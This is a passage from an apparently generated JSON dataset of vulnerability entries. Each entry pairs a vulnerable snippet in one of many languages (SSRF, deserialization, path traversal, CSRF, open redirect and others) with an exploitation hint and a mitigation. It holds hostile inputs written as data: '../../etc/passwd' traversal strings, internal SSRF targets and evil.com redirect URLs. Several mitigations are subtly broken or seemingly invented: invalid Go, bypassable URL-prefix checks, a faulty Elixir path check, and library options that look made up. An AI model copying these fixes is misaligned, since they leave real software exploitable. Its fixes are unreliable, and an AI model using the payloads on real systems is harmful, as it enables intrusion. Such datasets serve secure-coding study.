}
{
  "id": "vuln-441",
  "language": "Perl",
  "vulnerability_type": "Insecure Cookie Flags",
  "description": "Cookies without Secure or HttpOnly.",
  "code_snippet": "$r->headers_out->set('Set-Cookie' => \"session=$token\");",
  "exploitation_techniques": "Steal via XSS or insecure HTTP.",
  "mitigation": "Set: $r->headers_out->set('Set-Cookie' => \"session=$token; Secure; HttpOnly\")"
}
{
  "id": "vuln-442",
  "language": "Node.js",
  "vulnerability_type": "Server-Side Request Forgery",
  "description": "Unvalidated URLs in server requests.",
  "code_snippet": "axios.get(req.query.url);",
  "exploitation_techniques": "Access internal services: http://localhost:8080/admin",
  "mitigation": "Whitelist URLs: if (url.match(/^https:\/\/allowed\.com/)) axios.get(url)"
}
{
  "id": "vuln-443",
  "language": "Python",
  "vulnerability_type": "Server-Side Request Forgery",
  "description": "Fetching unvalidated URLs.",
  "code_snippet": "response = requests.get(request.args.get('url'))",
  "exploitation_techniques": "Request internal endpoints like http://127.0.0.1.",
  "mitigation": "Validate: if urlparse(url).hostname in ALLOWED_HOSTS: requests.get(url)"
}
{
  "id": "vuln-444",
  "language": "Java",
  "vulnerability_type": "Server-Side Request Forgery",
  "description": "Unvalidated URL fetching.",
  "code_snippet": "URL url = new URL(request.getParameter(\"url\")); url.openConnection().getInputStream();",
  "exploitation_techniques": "Access internal APIs or localhost.",
  "mitigation": "Whitelist: if (ALLOWED_HOSTS.contains(url.getHost())) url.openConnection()"
}
{
  "id": "vuln-445",
  "language": "PHP",
  "vulnerability_type": "Server-Side Request Forgery",
  "description": "Fetching unvalidated URLs.",
  "code_snippet": "file_get_contents($_GET['url']);",
  "exploitation_techniques": "Request internal resources: http://localhost.",
  "mitigation": "Validate: if (in_array(parse_url($url, PHP_URL_HOST), $allowed)) file_get_contents($url)"
}
{
  "id": "vuln-446",
  "language": "Ruby",
  "vulnerability_type": "Server-Side Request Forgery",
  "description": "Unvalidated URL requests.",
  "code_snippet": "response = Net::HTTP.get(URI(params[:url]))",
  "exploitation_techniques": "Access internal endpoints.",
  "mitigation": "Validate: Net::HTTP.get(URI(url)) if ALLOWED_HOSTS.include?(URI(url).host)"
}
{
  "id": "vuln-447",
  "language": "Go",
  "vulnerability_type": "Server-Side Request Forgery",
  "description": "Fetching unvalidated URLs.",
  "code_snippet": "resp, _ := http.Get(r.URL.Query().Get(\"url\"))",
  "exploitation_techniques": "Request internal services like http://127.0.0.1.",
  "mitigation": "Validate: if strings.HasPrefix(url, \"https://allowed.com\") { http.Get(url) }"
}
{
  "id": "vuln-448",
  "language": "C# (.NET)",
  "vulnerability_type": "Server-Side Request Forgery",
  "description": "Unvalidated URL fetching.",
  "code_snippet": "var response = await new HttpClient().GetAsync(Request.Query[\"url\"]);",
  "exploitation_techniques": "Access internal APIs.",
  "mitigation": "Validate: if (ALLOWED_HOSTS.Contains(new Uri(url).Host)) await client.GetAsync(url)"
}
{
  "id": "vuln-449",
  "language": "Kotlin",
  "vulnerability_type": "Server-Side Request Forgery",
  "description": "Fetching unvalidated URLs.",
  "code_snippet": "val response = URL(call.request.queryParameters[\"url\"]).readText()",
  "exploitation_techniques": "Request internal endpoints.",
  "mitigation": "Validate: if (url.host in ALLOWED_HOSTS) URL(url).readText()"
}
{
  "id": "vuln-450",
  "language": "Scala",
  "vulnerability_type": "Server-Side Request Forgery",
  "description": "Unvalidated URL requests.",
  "code_snippet": "val response = scala.io.Source.fromURL(params(\"url\")).mkString",
  "exploitation_techniques": "Access internal services.",
  "mitigation": "Validate: if (ALLOWED_HOSTS.contains(new URL(url).getHost)) Source.fromURL(url)"
}
{
  "id": "vuln-451",
  "language": "Rust",
  "vulnerability_type": "Server-Side Request Forgery",
  "description": "Fetching unvalidated URLs.",
  "code_snippet": "let resp = reqwest::get(&req.query(\"url\")?).await?;",
  "exploitation_techniques": "Request internal resources.",
  "mitigation": "Validate: if url.starts_with(\"https://allowed.com\") { reqwest::get(url) }"
}
{
  "id": "vuln-452",
  "language": "Elixir",
  "vulnerability_type": "Server-Side Request Forgery",
  "description": "Unvalidated URL fetching.",
  "code_snippet": "{:ok, _} = HTTPoison.get(params[\"url\"])",
  "exploitation_techniques": "Access internal endpoints.",
  "mitigation": "Validate: if String.starts_with?(url, \"https://allowed.com\") do HTTPoison.get(url) end"
}
{
  "id": "vuln-453",
  "language": "Perl",
  "vulnerability_type": "Server-Side Request Forgery",
  "description": "Fetching unvalidated URLs.",
  "code_snippet": "my $response = LWP::UserAgent->new->get($r->param('url'));",
  "exploitation_techniques": "Request internal services.",
  "mitigation": "Validate: $ua->get($url) if grep { $url =~ /^$_/ } @allowed;"
}
{
  "id": "vuln-454",
  "language": "Node.js",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Deserializing untrusted data with node-serialize.",
  "code_snippet": "const serialize = require('node-serialize'); serialize.unserialize(userInput);",
  "exploitation_techniques": "Inject malicious serialized objects for RCE.",
  "mitigation": "Avoid deserialization; use JSON.parse with validation."
}
{
  "id": "vuln-455",
  "language": "Python",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Using pickle for untrusted data.",
  "code_snippet": "import pickle; obj = pickle.loads(request.data)",
  "exploitation_techniques": "Craft pickle payload for RCE.",
  "mitigation": "Use JSON or YAML.safe_load; avoid pickle."
}
{
  "id": "vuln-456",
  "language": "Java",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Deserializing untrusted data with ObjectInputStream.",
  "code_snippet": "ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data)); ois.readObject();",
  "exploitation_techniques": "Inject gadget chains for RCE.",
  "mitigation": "Use ObjectInputFilter; whitelist classes."
}
{
  "id": "vuln-457",
  "language": "PHP",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Unserializing untrusted data.",
  "code_snippet": "$obj = unserialize($_POST['data']);",
  "exploitation_techniques": "Inject malicious serialized objects.",
  "mitigation": "Avoid unserialize; use JSON or safe formats."
}
{
  "id": "vuln-458",
  "language": "Ruby",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Using Marshal.load on untrusted data.",
  "code_snippet": "obj = Marshal.load(user_input)",
  "exploitation_techniques": "Craft malicious payload for RCE.",
  "mitigation": "Use JSON; avoid Marshal.load on user input."
}
{
  "id": "vuln-459",
  "language": "Go",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Decoding untrusted gob data.",
  "code_snippet": "decoder := gob.NewDecoder(bytes.NewReader(data)); decoder.Decode(&obj);",
  "exploitation_techniques": "Inject malicious gob data.",
  "mitigation": "Use JSON or safe formats; avoid gob for user input."
}
{
  "id": "vuln-460",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Using BinaryFormatter on untrusted data.",
  "code_snippet": "BinaryFormatter bf = new BinaryFormatter(); bf.Deserialize(stream);",
  "exploitation_techniques": "Inject malicious serialized objects.",
  "mitigation": "Use JsonSerializer; avoid BinaryFormatter."
}
{
  "id": "vuln-461",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Deserializing untrusted data.",
  "code_snippet": "val ois = ObjectInputStream(ByteArrayInputStream(data)); val obj = ois.readObject()",
  "exploitation_techniques": "Craft malicious objects for RCE.",
  "mitigation": "Use JSON or safe formats; avoid ObjectInputStream."
}
{
  "id": "vuln-462",
  "language": "Scala",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Deserializing untrusted Java objects.",
  "code_snippet": "val ois = new ObjectInputStream(new ByteArrayInputStream(data)); ois.readObject()",
  "exploitation_techniques": "Inject gadget chains for RCE.",
  "mitigation": "Use JSON; avoid ObjectInputStream for user data."
}
{
  "id": "vuln-463",
  "language": "Rust",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Using serde with untrusted data.",
  "code_snippet": "let obj: T = serde_json::from_str(&user_input)?;",
  "exploitation_techniques": "Inject malicious JSON to manipulate structs.",
  "mitigation": "Validate JSON schema; use strict typing."
}
{
  "id": "vuln-464",
  "language": "Elixir",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Using :erlang.binary_to_term on untrusted data.",
  "code_snippet": "obj = :erlang.binary_to_term(user_input)",
  "exploitation_techniques": "Craft malicious terms for RCE.",
  "mitigation": "Use Jason.decode!; avoid binary_to_term."
}
{
  "id": "vuln-465",
  "language": "Perl",
  "vulnerability_type": "Insecure Deserialization",
  "description": "Using Storable::thaw on untrusted data.",
  "code_snippet": "use Storable qw(thaw); my $obj = thaw($user_input);",
  "exploitation_techniques": "Inject malicious serialized data.",
  "mitigation": "Use JSON::XS; avoid Storable for user input."
}
{
  "id": "vuln-466",
  "language": "Node.js",
  "vulnerability_type": "Insecure GraphQL Introspection",
  "description": "Exposing GraphQL introspection queries.",
  "code_snippet": "const schema = buildSchema(typeDefs); app.use('/graphql', graphqlHTTP({ schema }));",
  "exploitation_techniques": "Query schema to map API and craft attacks.",
  "mitigation": "Disable introspection: graphqlHTTP({ schema, introspection: false })"
}
{
  "id": "vuln-467",
  "language": "Python",
  "vulnerability_type": "Insecure GraphQL Introspection",
  "description": "Allowing GraphQL introspection.",
  "code_snippet": "schema = graphene.Schema(query=Query); app.add_url_rule('/graphql', view_func=GraphQLView.as_view('graphql', schema=schema))",
  "exploitation_techniques": "Extract schema to plan attacks.",
  "mitigation": "Disable introspection: schema = graphene.Schema(query=Query, auto_camelcase=False, introspection=False)"
}
{
  "id": "vuln-468",
  "language": "Java",
  "vulnerability_type": "Insecure GraphQL Introspection",
  "description": "Exposing GraphQL schema introspection.",
  "code_snippet": "@GraphQLApi public class GraphQLController { @GraphQLQuery public DataFetcher<?> query() { ... } }",
  "exploitation_techniques": "Query schema to discover endpoints.",
  "mitigation": "Disable introspection in GraphQL configuration."
}
{
  "id": "vuln-469",
  "language": "PHP",
  "vulnerability_type": "Insecure GraphQL Introspection",
  "description": "Allowing GraphQL introspection queries.",
  "code_snippet": "$schema = new Schema(['query' => $queryType]); $result = GraphQL::executeQuery($schema, $request->query);",
  "exploitation_techniques": "Map schema to craft targeted queries.",
  "mitigation": "Disable introspection: $schema->disableIntrospection()"
}
{
  "id": "vuln-470",
  "language": "Ruby",
  "vulnerability_type": "Insecure GraphQL Introspection",
  "description": "Exposing GraphQL introspection.",
  "code_snippet": "class MySchema < GraphQL::Schema; query Types::Query; end",
  "exploitation_techniques": "Query schema to extract API details.",
  "mitigation": "Disable: class MySchema < GraphQL::Schema; query Types::Query; introspection false; end"
}
{
  "id": "vuln-471",
  "language": "Go",
  "vulnerability_type": "Insecure GraphQL Introspection",
  "description": "Allowing GraphQL introspection.",
  "code_snippet": "schema, _ := graphql.NewSchema(graphql.SchemaConfig{Query: queryType})",
  "exploitation_techniques": "Extract schema to plan attacks.",
  "mitigation": "Disable introspection in gqlgen configuration."
}
{
  "id": "vuln-472",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure GraphQL Introspection",
  "description": "Exposing GraphQL introspection.",
  "code_snippet": "services.AddGraphQL().AddSchema<MySchema>();",
  "exploitation_techniques": "Query schema to map API.",
  "mitigation": "Disable: AddGraphQL().AddSchema<MySchema>().DisableIntrospection()"
}
{
  "id": "vuln-473",
  "language": "Kotlin",
  "vulnerability_type": "Insecure GraphQL Introspection",
  "description": "Allowing GraphQL introspection queries.",
  "code_snippet": "graphql { schema { query = Query::class } }",
  "exploitation_techniques": "Extract schema for attack planning.",
  "mitigation": "Disable introspection in GraphQL-Kotlin config."
}
{
  "id": "vuln-474",
  "language": "Scala",
  "vulnerability_type": "Insecure GraphQL Introspection",
  "description": "Exposing GraphQL introspection.",
  "code_snippet": "SchemaDefinition(queries = List(Field(\"query\", ...)))",
  "exploitation_techniques": "Query schema to discover endpoints.",
  "mitigation": "Disable introspection in Sangria configuration."
}
{
  "id": "vuln-475",
  "language": "Rust",
  "vulnerability_type": "Insecure GraphQL Introspection",
  "description": "Allowing GraphQL introspection.",
  "code_snippet": "let schema = Schema::build(Query, EmptyMutation, EmptySubscription).finish();",
  "exploitation_techniques": "Map schema to craft attacks.",
  "mitigation": "Disable introspection in Juniper configuration."
}
{
  "id": "vuln-476",
  "language": "Elixir",
  "vulnerability_type": "Insecure GraphQL Introspection",
  "description": "Exposing GraphQL introspection.",
  "code_snippet": "schema do query do ... end end",
  "exploitation_techniques": "Query schema to extract API details.",
  "mitigation": "Disable: Absinthe.Schema.introspection(false)"
}
{
  "id": "vuln-477",
  "language": "Perl",
  "vulnerability_type": "Insecure GraphQL Introspection",
  "description": "Allowing GraphQL introspection queries.",
  "code_snippet": "my $schema = GraphQL::Schema->new(query => $query);",
  "exploitation_techniques": "Extract schema to plan attacks.",
  "mitigation": "Disable introspection in GraphQL::Perl config."
}
{
  "id": "vuln-478",
  "language": "Node.js",
  "vulnerability_type": "Path Traversal",
  "description": "Unvalidated file path access.",
  "code_snippet": "fs.readFileSync(path.join('public', req.query.file))",
  "exploitation_techniques": "Access: ../../etc/passwd",
  "mitigation": "Validate: path.resolve('public', file).startsWith(process.cwd() + '/public')"
}
{
  "id": "vuln-479",
  "language": "Python",
  "vulnerability_type": "Path Traversal",
  "description": "Unvalidated file path in file read.",
  "code_snippet": "with open(os.path.join('public', request.args.get('file'))) as f: return f.read()",
  "exploitation_techniques": "Access: ../../etc/passwd",
  "mitigation": "Validate: os.path.realpath(path).startswith(os.path.realpath('public'))"
}
{
  "id": "vuln-480",
  "language": "Java",
  "vulnerability_type": "Path Traversal",
  "description": "Unvalidated file path access.",
  "code_snippet": "Files.readString(Paths.get(\"public\", request.getParameter(\"file\")));",
  "exploitation_techniques": "Access: ../../etc/passwd",
  "mitigation": "Validate: Paths.get('public', file).normalize().startsWith(Paths.get('public'))"
}
{
  "id": "vuln-481",
  "language": "PHP",
  "vulnerability_type": "Path Traversal",
  "description": "Unvalidated file path in read.",
  "code_snippet": "readfile('public/' . $_GET['file']);",
  "exploitation_techniques": "Access: ../../etc/passwd",
  "mitigation": "Validate: realpath('public/' . $file) starts with base dir."
}
{
  "id": "vuln-482",
  "language": "Ruby",
  "vulnerability_type": "Path Traversal",
  "description": "Unvalidated file path access.",
  "code_snippet": "File.read(File.join('public', params[:file]))",
  "exploitation_techniques": "Access: ../../etc/passwd",
  "mitigation": "Validate: File.expand_path(file, 'public').start_with?(Dir.pwd + '/public')"
}
{
  "id": "vuln-483",
  "language": "Go",
  "vulnerability_type": "Path Traversal",
  "description": "Unvalidated file path in read.",
  "code_snippet": "data, _ := os.ReadFile(filepath.Join(\"public\", r.URL.Query().Get(\"file\")))",
  "exploitation_techniques": "Access: ../../etc/passwd",
  "mitigation": "Validate: filepath.Clean(path).HasPrefix(\"public\")"
}
{
  "id": "vuln-484",
  "language": "C# (.NET)",
  "vulnerability_type": "Path Traversal",
  "description": "Unvalidated file path access.",
  "code_snippet": "File.ReadAllText(Path.Combine(\"public\", Request.Query[\"file\"]))",
  "exploitation_techniques": "Access: ../../web.config",
  "mitigation": "Validate: Path.GetFullPath(path).StartsWith(Path.GetFullPath(\"public\"))"
}
{
  "id": "vuln-485",
  "language": "Kotlin",
  "vulnerability_type": "Path Traversal",
  "description": "Unvalidated file path in read.",
  "code_snippet": "File(\"public/${call.request.queryParameters[\"file\"]}\").readText()",
  "exploitation_techniques": "Access: ../../etc/passwd",
  "mitigation": "Validate: File(baseDir, file).canonicalPath.startsWith(baseDir.canonicalPath)"
}
{
  "id": "vuln-486",
  "language": "Scala",
  "vulnerability_type": "Path Traversal",
  "description": "Unvalidated file path access.",
  "code_snippet": "scala.io.Source.fromFile(s\"public/${params(\"file\")}\").mkString",
  "exploitation_techniques": "Access: ../../etc/passwd",
  "mitigation": "Validate: new File(baseDir, file).getCanonicalPath.startsWith(baseDir)"
}
{
  "id": "vuln-487",
  "language": "Rust",
  "vulnerability_type": "Path Traversal",
  "description": "Unvalidated file path in read.",
  "code_snippet": "fs::read_to_string(Path::new(\"public\").join(req.query(\"file\")?))?",
  "exploitation_techniques": "Access: ../../etc/passwd",
  "mitigation": "Validate: path.canonicalize()?.starts_with(Path::new(\"public\").canonicalize()?)"
}
{
  "id": "vuln-488",
  "language": "Elixir",
  "vulnerability_type": "Path Traversal",
  "description": "Unvalidated file path access.",
  "code_snippet": "File.read!(\"public/\" <> params[\"file\"])",
  "exploitation_techniques": "Access: ../../etc/passwd",
  "mitigation": "Validate: Path.expand(file, \"public\") |> String.starts_with?(\"public\")"
}
{
  "id": "vuln-489",
  "language": "Perl",
  "vulnerability_type": "Path Traversal",
  "description": "Unvalidated file path in read.",
  "code_snippet": "open(my $fh, '<', \"public/$filename\");",
  "exploitation_techniques": "Access: ../../etc/passwd",
  "mitigation": "Validate: realpath(\"public/$filename\") =~ /^$base_dir/"
}
{
  "id": "vuln-490",
  "language": "Node.js",
  "vulnerability_type": "Insecure Rate Limiting",
  "description": "No rate limiting on sensitive endpoints.",
  "code_snippet": "app.post('/login', (req, res) => authenticate(req.body));",
  "exploitation_techniques": "Brute force login attempts.",
  "mitigation": "Use express-rate-limit: app.use(rateLimit({ windowMs: 15 * 60 * 1000, max: 5 }))"
}
{
  "id": "vuln-491",
  "language": "Python",
  "vulnerability_type": "Insecure Rate Limiting",
  "description": "No rate limiting on authentication.",
  "code_snippet": "@app.route('/login', methods=['POST']) def login(): authenticate(request.form)",
  "exploitation_techniques": "Brute force credentials.",
  "mitigation": "Use Flask-Limiter: limiter.limit(\"5 per minute\")(login)"
}
{
  "id": "vuln-492",
  "language": "Java",
  "vulnerability_type": "Insecure Rate Limiting",
  "description": "No rate limiting on login endpoint.",
  "code_snippet": "@PostMapping(\"/login\") public Response login(@RequestBody Credentials creds) { ... }",
  "exploitation_techniques": "Brute force login attempts.",
  "mitigation": "Use Spring Security rate limiting or custom filter."
}
{
  "id": "vuln-493",
  "language": "PHP",
  "vulnerability_type": "Insecure Rate Limiting",
  "description": "No rate limiting on sensitive routes.",
  "code_snippet": "if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_SERVER['REQUEST_URI'] === '/login') { authenticate($_POST); }",
  "exploitation_techniques": "Brute force credentials.",
  "mitigation": "Use rate limiting middleware like throttle."
}
{
  "id": "vuln-494",
  "language": "Ruby",
  "vulnerability_type": "Insecure Rate Limiting",
  "description": "No rate limiting on authentication.",
  "code_snippet": "post '/login' do authenticate(params) end",
  "exploitation_techniques": "Brute force login attempts.",
  "mitigation": "Use rack-attack: Rack::Attack.throttle('logins/ip', limit: 5, period: 60)"
}
{
  "id": "vuln-495",
  "language": "Go",
  "vulnerability_type": "Insecure Rate Limiting",
  "description": "No rate limiting on login endpoint.",
  "code_snippet": "http.HandleFunc(\"/login\", func(w http.ResponseWriter, r *http.Request) { authenticate(r) })",
  "exploitation_techniques": "Brute force credentials.",
  "mitigation": "Use rate limiter: github.com/ulule/limiter"
}
{
  "id": "vuln-496",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Rate Limiting",
  "description": "No rate limiting on sensitive endpoints.",
  "code_snippet": "[HttpPost(\"login\")] public IActionResult Login([FromBody] Credentials creds) { ... }",
  "exploitation_techniques": "Brute force login attempts.",
  "mitigation": "Use AspNetCoreRateLimit: services.AddRateLimiting()"
}
{
  "id": "vuln-497",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Rate Limiting",
  "description": "No rate limiting on authentication.",
  "code_snippet": "post(\"/login\") { authenticate(call.request.receive()) }",
  "exploitation_techniques": "Brute force credentials.",
  "mitigation": "Use Ktor rate limiting plugin: install(RateLimit) { limit = 5; period = 60.seconds }"
}
{
  "id": "vuln-498",
  "language": "Scala",
  "vulnerability_type": "Insecure Rate Limiting",
  "description": "No rate limiting on login endpoint.",
  "code_snippet": "post(\"/login\") { authenticate(params.as[Credentials]) }",
  "exploitation_techniques": "Brute force login attempts.",
  "mitigation": "Use Play filters: add RateLimitFilter(limit = 5, window = 60.seconds)"
}
{
  "id": "vuln-499",
  "language": "Rust",
  "vulnerability_type": "Insecure Rate Limiting",
  "description": "No rate limiting on sensitive routes.",
  "code_snippet": "router.post(\"/login\", |req| authenticate(req.body()?))",
  "exploitation_techniques": "Brute force credentials.",
  "mitigation": "Use actix-web middleware for rate limiting."
}
{
  "id": "vuln-500",
  "language": "Elixir",
  "vulnerability_type": "Insecure Rate Limiting",
  "description": "No rate limiting on authentication.",
  "code_snippet": "post \"/login\", AuthController, :login",
  "exploitation_techniques": "Brute force login attempts.",
  "mitigation": "Use Plug.RateLimit: plug :rate_limit, max: 5, interval: 60_000"
}
{
  "id": "vuln-501",
  "language": "Perl",
  "vulnerability_type": "Insecure Rate Limiting",
  "description": "No rate limiting on authentication endpoints.",
  "code_snippet": "if ($r->uri eq '/login') { authenticate($r->param('user')); }",
  "exploitation_techniques": "Brute force credentials via rapid requests.",
  "mitigation": "Implement rate limiting: use Apache::Throttle; throttle('login', 5, 60);"
}
{
  "id": "vuln-502",
  "language": "Node.js",
  "vulnerability_type": "Insecure CSRF Token Storage",
  "description": "Storing CSRF tokens in cookies without validation.",
  "code_snippet": "res.cookie('csrf_token', token); app.post('/action', verifyCsrf);",
  "exploitation_techniques": "Forge CSRF tokens via cookie manipulation.",
  "mitigation": "Store tokens server-side; use csurf middleware with session validation."
}
{
  "id": "vuln-503",
  "language": "Python",
  "vulnerability_type": "Insecure CSRF Token Storage",
  "description": "CSRF tokens stored in cookies without server-side checks.",
  "code_snippet": "response.set_cookie('csrf_token', token); @app.route('/action', methods=['POST'])",
  "exploitation_techniques": "Manipulate CSRF cookie to bypass protection.",
  "mitigation": "Use Flask-WTF with server-side token validation."
}
{
  "id": "vuln-504",
  "language": "Java",
  "vulnerability_type": "Insecure CSRF Token Storage",
  "description": "Storing CSRF tokens in cookies without validation.",
  "code_snippet": "response.addCookie(new Cookie(\"csrf_token\", token));",
  "exploitation_techniques": "Forge CSRF tokens via cookie injection.",
  "mitigation": "Use Spring Security CSRF protection with server-side token storage."
}
{
  "id": "vuln-505",
  "language": "PHP",
  "vulnerability_type": "Insecure CSRF Token Storage",
  "description": "CSRF tokens in cookies without server-side checks.",
  "code_snippet": "setcookie('csrf_token', $token); if ($_POST['token'] == $_COOKIE['csrf_token']) { ... }",
  "exploitation_techniques": "Manipulate CSRF cookie to bypass checks.",
  "mitigation": "Store tokens in session: $_SESSION['csrf_token'] = $token;"
}
{
  "id": "vuln-506",
  "language": "Ruby",
  "vulnerability_type": "Insecure CSRF Token Storage",
  "description": "CSRF tokens stored in cookies without validation.",
  "code_snippet": "cookies[:csrf_token] = token; verify_authenticity_token",
  "exploitation_techniques": "Forge CSRF tokens via cookie manipulation.",
  "mitigation": "Use Rails protect_from_forgery with session-based tokens."
}
{
  "id": "vuln-507",
  "language": "Go",
  "vulnerability_type": "Insecure CSRF Token Storage",
  "description": "Storing CSRF tokens in cookies without server-side validation.",
  "code_snippet": "http.SetCookie(w, &http.Cookie{Name: \"csrf_token\", Value: token});",
  "exploitation_techniques": "Manipulate CSRF cookie to bypass checks.",
  "mitigation": "Store tokens server-side; use gorilla/csrf middleware."
}
{
  "id": "vuln-508",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure CSRF Token Storage",
  "description": "CSRF tokens in cookies without validation.",
  "code_snippet": "Response.Cookies.Append(\"csrf_token\", token);",
  "exploitation_techniques": "Forge CSRF tokens via cookies.",
  "mitigation": "Use AntiForgeryToken with server-side validation."
}
{
  "id": "vuln-509",
  "language": "Kotlin",
  "vulnerability_type": "Insecure CSRF Token Storage",
  "description": "CSRF tokens stored in cookies without checks.",
  "code_snippet": "call.response.cookies.append(\"csrf_token\", token)",
  "exploitation_techniques": "Manipulate CSRF cookie to bypass protection.",
  "mitigation": "Use Ktor CSRF protection with session-based tokens."
}
{
  "id": "vuln-510",
  "language": "Scala",
  "vulnerability_type": "Insecure CSRF Token Storage",
  "description": "CSRF tokens in cookies without server-side validation.",
  "code_snippet": "Ok.withCookies(Cookie(\"csrf_token\", token))",
  "exploitation_techniques": "Forge CSRF tokens via cookie injection.",
  "mitigation": "Use Play Framework CSRF filter with session storage."
}
{
  "id": "vuln-511",
  "language": "Rust",
  "vulnerability_type": "Insecure CSRF Token Storage",
  "description": "CSRF tokens stored in cookies without validation.",
  "code_snippet": "res.cookie(Cookie::new(\"csrf_token\", token))",
  "exploitation_techniques": "Manipulate CSRF cookie to bypass checks.",
  "mitigation": "Use actix-web CSRF middleware with server-side tokens."
}
{
  "id": "vuln-512",
  "language": "Elixir",
  "vulnerability_type": "Insecure CSRF Token Storage",
  "description": "CSRF tokens in cookies without server-side checks.",
  "code_snippet": "put_resp_cookie(conn, \"csrf_token\", token)",
  "exploitation_techniques": "Forge CSRF tokens via cookies.",
  "mitigation": "Use Plug.CSRFProtection with session-based tokens."
}
{
  "id": "vuln-513",
  "language": "Perl",
  "vulnerability_type": "Insecure CSRF Token Storage",
  "description": "CSRF tokens stored in cookies without validation.",
  "code_snippet": "$r->headers_out->set('Set-Cookie' => \"csrf_token=$token\");",
  "exploitation_techniques": "Manipulate CSRF cookie to bypass checks.",
  "mitigation": "Store tokens in session; validate server-side."
}
{
  "id": "vuln-514",
  "language": "Node.js",
  "vulnerability_type": "Open Redirect",
  "description": "Unvalidated redirect URLs.",
  "code_snippet": "res.redirect(req.query.url);",
  "exploitation_techniques": "Redirect to malicious site: ?url=http://evil.com",
  "mitigation": "Whitelist: if (url.match(/^https:\/\/mydomain\.com/)) res.redirect(url)"
}
{
  "id": "vuln-515",
  "language": "Python",
  "vulnerability_type": "Open Redirect",
  "description": "Unvalidated redirect URLs.",
  "code_snippet": "return redirect(request.args.get('url'))",
  "exploitation_techniques": "Redirect to phishing site: ?url=http://evil.com",
  "mitigation": "Validate: if urlparse(url).netloc == 'mydomain.com': redirect(url)"
}
{
  "id": "vuln-516",
  "language": "Java",
  "vulnerability_type": "Open Redirect",
  "description": "Unvalidated redirect URLs.",
  "code_snippet": "response.sendRedirect(request.getParameter(\"url\"));",
  "exploitation_techniques": "Redirect to malicious site.",
  "mitigation": "Validate: if (ALLOWED_HOSTS.contains(new URL(url).getHost())) sendRedirect(url)"
}
{
  "id": "vuln-517",
  "language": "PHP",
  "vulnerability_type": "Open Redirect",
  "description": "Unvalidated redirect URLs.",
  "code_snippet": "header('Location: ' . $_GET['url']);",
  "exploitation_techniques": "Redirect to phishing site.",
  "mitigation": "Validate: if (parse_url($url, PHP_URL_HOST) === 'mydomain.com') header('Location: ' . $url);"
}
{
  "id": "vuln-518",
  "language": "Ruby",
  "vulnerability_type": "Open Redirect",
  "description": "Unvalidated redirect URLs.",
  "code_snippet": "redirect_to params[:url]",
  "exploitation_techniques": "Redirect to malicious site.",
  "mitigation": "Validate: redirect_to url if URI(url).host == 'mydomain.com'"
}
{
  "id": "vuln-519",
  "language": "Go",
  "vulnerability_type": "Open Redirect",
  "description": "Unvalidated redirect URLs.",
  "code_snippet": "http.Redirect(w, r, r.URL.Query().Get(\"url\"), http.StatusFound)",
  "exploitation_techniques": "Redirect to phishing site.",
  "mitigation": "Validate: if strings.HasPrefix(url, \"https://mydomain.com\") { http.Redirect(w, r, url, http.StatusFound) }"
}
{
  "id": "vuln-520",
  "language": "C# (.NET)",
  "vulnerability_type": "Open Redirect",
  "description": "Unvalidated redirect URLs.",
  "code_snippet": "return Redirect(Request.Query[\"url\"]);",
  "exploitation_techniques": "Redirect to malicious site.",
  "mitigation": "Validate: if (new Uri(url).Host == \"mydomain.com\") return Redirect(url);"
}
{
  "id": "vuln-521",
  "language": "Kotlin",
  "vulnerability_type": "Open Redirect",
  "description": "Unvalidated redirect URLs.",
  "code_snippet": "call.respondRedirect(call.request.queryParameters[\"url\"]!!)",
  "exploitation_techniques": "Redirect to phishing site.",
  "mitigation": "Validate: if (url.host == \"mydomain.com\") call.respondRedirect(url)"
}
{
  "id": "vuln-522",
  "language": "Scala",
  "vulnerability_type": "Open Redirect",
  "description": "Unvalidated redirect URLs.",
  "code_snippet": "Redirect(params(\"url\"))",
  "exploitation_techniques": "Redirect to malicious site.",
  "mitigation": "Validate: if (new URL(url).getHost == \"mydomain.com\") Redirect(url)"
}
{
  "id": "vuln-523",
  "language": "Rust",
  "vulnerability_type": "Open Redirect",
  "description": "Unvalidated redirect URLs.",
  "code_snippet": "res.redirect(&req.query(\"url\")?)",
  "exploitation_techniques": "Redirect to phishing site.",
  "mitigation": "Validate: if url.starts_with(\"https://mydomain.com\") { res.redirect(url) }"
}
{
  "id": "vuln-524",
  "language": "Elixir",
  "vulnerability_type": "Open Redirect",
  "description": "Unvalidated redirect URLs.",
  "code_snippet": "redirect conn, external: params[\"url\"]",
  "exploitation_techniques": "Redirect to malicious site.",
  "mitigation": "Validate: if String.starts_with?(url, \"https://mydomain.com\") do redirect conn, external: url end"
}
{
  "id": "vuln-525",
  "language": "Perl",
  "vulnerability_type": "Open Redirect",
  "description": "Unvalidated redirect URLs.",
  "code_snippet": "$r->headers_out->set('Location' => $r->param('url'));",
  "exploitation_techniques": "Redirect to phishing site.",
  "mitigation": "Validate: $r->headers_out->set('Location' => $url) if $url =~ /^https:\/\/mydomain\.com/;"
}
{
  "id": "vuln-526",
  "language": "Node.js",
  "vulnerability_type": "Insecure OAuth Redirect",
  "description": "Unvalidated OAuth redirect URIs.",
  "code_snippet": "const redirectUri = req.query.redirect_uri; res.redirect(redirectUri);",
  "exploitation_techniques": "Redirect to malicious OAuth handler.",
  "mitigation": "Validate: if (ALLOWED_REDIRECTS.includes(redirectUri)) res.redirect(redirectUri)"
}
{
  "id": "vuln-527",
  "language": "Python",
  "vulnerability_type": "Insecure OAuth Redirect",
  "description": "Unvalidated OAuth redirect URIs.",
  "code_snippet": "return redirect(request.args.get('redirect_uri'))",
  "exploitation_techniques": "Steal OAuth tokens via malicious redirect.",
  "mitigation": "Validate: if redirect_uri in ALLOWED_REDIRECTS: redirect(redirect_uri)"
}
{
